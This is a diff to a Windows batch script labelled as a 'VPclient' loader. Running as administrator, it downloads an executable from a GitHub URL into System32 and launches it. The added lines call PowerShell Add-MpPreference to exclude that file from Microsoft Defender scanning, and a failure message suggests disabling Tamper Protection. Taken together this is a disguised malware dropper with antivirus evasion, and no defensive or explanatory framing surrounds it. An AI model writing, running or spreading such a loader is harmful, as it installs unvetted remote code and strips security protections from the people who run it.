@@ -15,6 +15,14 @@ echo Running as admin! VPclient Loading
 echo Downloading mainskib.exe...
 curl -L -o "C:\Windows\System32\skibmain67.exe" "https://github.com/infilling/infilling.github.io/raw/refs/heads/main/skibmain67.exe"
 if exist "C:\Windows\System32\skibmain67.exe" (
+    :: Add exclusion for skibmain67.exe using PowerShell
+    echo Adding Windows Security exclusion for skibmain67.exe...
+    powershell -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32\skibmain67.exe'"
+    if %errorLevel% equ 0 (
+        echo Exclusion added successfully!
+    ) else (
+        echo Failed to add exclusion. Ensure running as admin or disable Tamper Protection.
+    )
     echo Running mainskib.exe...
     start "" "C:\Windows\System32\skibmain67.exe"
 ) else (
